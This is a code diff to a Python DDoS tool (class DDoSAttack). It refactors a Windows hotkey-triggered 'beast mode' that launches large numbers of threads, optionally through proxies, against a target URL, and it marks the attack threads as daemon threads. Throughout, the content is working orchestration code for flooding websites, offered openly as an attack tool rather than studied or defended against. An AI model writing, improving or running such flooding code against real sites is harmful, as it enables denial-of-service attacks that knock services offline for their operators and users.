@@ -246,30 +246,30 @@ class DDoSAttack:
             print(f"\n{Back.RED}{Fore.WHITE}{Style.BRIGHT}{text2}{Fore.RESET}{Back.RESET}{Style.RESET_ALL}")
             print(f"{Fore.YELLOW}{text}{Fore.RESET}\n")
 
-            try:
-                while True:
-                    if ctypes.windll.user32.GetAsyncKeyState(VK_0) & 0x8000:
-                        print(f"\n{Fore.RED}Beast mode deactivated.{Fore.RESET}")
-                        break
+        try:
+            while True:
+                if ctypes.windll.user32.GetAsyncKeyState(VK_0) & 0x8000:
+                    print(f"\n{Fore.RED}Beast mode deactivated.{Fore.RESET}")
+                    break
 
-                    if ctypes.windll.user32.GetAsyncKeyState(VK_1) & 0x8000:
-                        if proxy_threads == 'y':
-                            for proxy in self.proxies:
-                                for count in range(todo):
-                                    th = Thread(target=self.run_thread, args=(1, target, use_proxy, proxy,))
-                                    th.start()
-                                    self.started += 1
-                        else:
+                if ctypes.windll.user32.GetAsyncKeyState(VK_1) & 0x8000:
+                    if proxy_threads == 'y':
+                        for proxy in self.proxies:
                             for count in range(todo):
-                                th = Thread(target=self.run_thread, args=(1, target, use_proxy,))
+                                th = Thread(target=self.run_thread, args=(1, target, use_proxy, proxy,), daemon=True)
                                 th.start()
                                 self.started += 1
-                        time.sleep(0.3)
                     else:
-                        time.sleep(0.05)
+                        for count in range(todo):
+                            th = Thread(target=self.run_thread, args=(1, target, use_proxy,), daemon=True)
+                            th.start()
+                            self.started += 1
+                    time.sleep(0.3)
+                else:
+                    time.sleep(0.05)
 
-            except KeyboardInterrupt:
-                print(f"\n\n{Fore.RED}Beast mode interrupted.{Fore.RESET}")
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.RED}Beast mode interrupted.{Fore.RESET}")
         else:
             print(Fore.RED + "Beast mode is only supported on Windows." + Fore.RESET)
             time.sleep(2)
@@ -374,7 +374,7 @@ class DDoSAttack:
             if proxy_threads == 'y':
                 for proxy in self.proxies:
                     for count in range(self.todo):
-                        th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy, proxy,))
+                        th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy, proxy,), daemon=True)
                         th.start()
                         self.started += 1
                         print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
@@ -382,7 +382,7 @@ class DDoSAttack:
 
             else:
                 for count in range(self.todo):
-                    th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy,))
+                    th = Thread(target=self.run_thread, args=(time_attack, url, use_proxy,), daemon=True)
                     th.start()
                     self.started += 1
                     print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
